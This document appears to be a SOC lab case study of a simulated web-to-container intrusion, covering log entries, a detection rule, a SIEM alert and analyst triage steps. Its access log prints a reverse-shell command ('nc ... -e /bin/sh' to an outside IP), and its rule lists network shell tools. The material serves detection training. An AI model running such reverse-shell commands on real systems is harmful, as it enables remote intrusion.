# 📁 SOC Incident Response Case Study: Multi-Stage Intrusion Triage

## Executive Summary
This case study documents a simulated multi-stage cyber intrusion against containerized infrastructure, tracking the threat vector from initial access through privilege escalation and detection triage within the **SOC Telemetry Detection Lab**.

---

## 🎯 Incident Scenario: Web Vector to SUID Privilege Escalation

```
[Attacker IP: 185.220.101.5] 
       │ (1. POST Payload RCE)
       ▼
[Container: cnt-web-frontend-03] (nginx / www-data)
       │ (2. Spawn Reverse Shell)
       ▼
[Process: /usr/bin/nc -e /bin/sh] ──► Triggers RULE-003 (CRITICAL)
       │ (3. SUID Elevation)
       ▼
[Process: /bin/bash (UID 0)] ──► Triggers RULE-002 (CRITICAL)
```

---

## 1. Raw Telemetry Event Ingestion

### Step 1: Web Application RCE & Shell Execution
```log
185.220.101.5 - - [15/Jan/2026:14:22:10 +0000] "POST /upload.php?cmd=nc+185.220.101.5+4444+-e+/bin/sh HTTP/1.1" 200 512 "-" "python-requests/2.28.1"
```
```log
type=SYSCALL msg=audit(1768486930.800:512): arch=c000003e syscall=59 success=yes exit=0 ppid=890 pid=3410 auid=4294967295 uid=33(www-data) gid=33(www-data) euid=33 exe="/usr/bin/nc.traditional" key="exec"
```

---

## 2. SIGMA Rule Evaluation & Match

The Detection Engine evaluates the raw `auditd` syscall trace against **`RULE-003: Anomalous Shell Spawning from Web Server Process`**:

```yaml
id: RULE-003
title: Anomalous Shell Spawning from Web Server Process
severity: CRITICAL
log_source:
  log_type: auditd.log
detection:
  selection:
    event_id: AUDITD_ANOMALOUS_CHILD_PROCESS
  condition:
    - field: parent_process_name
      operator: in
      value: [nginx, apache2, httpd]
    - field: process_name
      operator: in
      value: [sh, bash, nc, ncat]
```

---

## 3. SIEM Alert Generation & MITRE ATT&CK Mapping

```json
{
  "alert_id": "ALT-8F92A1C4",
  "rule_id": "RULE-003",
  "severity": "CRITICAL",
  "mitre_tactic": "Execution",
  "mitre_technique_id": "T1059.004",
  "mitre_technique_name": "Unix Shell Execution via Web Vector",
  "hostname": "host-k8s-worker-1",
  "container_id": "cnt-web-frontend-03",
  "status": "NEW",
  "sample_raw_logs": [
    "type=SYSCALL msg=audit(1768486930.800:512): syscall=59 exe=\"/usr/bin/nc.traditional\""
  ]
}
```

---

## 4. SOC Analyst Triage Workflow & Response

1. **Triage Transition**: SOC Analyst marks alert as `INVESTIGATING` and attaches initial forensic notes:
   * `"Observed parent process nginx (PID 890) spawning reverse shell nc to 185.220.101.5:4444."`
2. **Containment & Remediation**:
   * **Container Isolation**: Trigger container network isolation for `cnt-web-frontend-03`.
   * **Process Termination**: Kill PID 3410 (`nc.traditional`).
   * **Rule Tuning**: Verify no baseline false positives occurred; precision metric maintained at **100.0%**.
3. **Escalation & Closure**: Alert marked as `ESCALATED` to Incident Response Team, then `CLOSED` after vulnerability patch deployment.
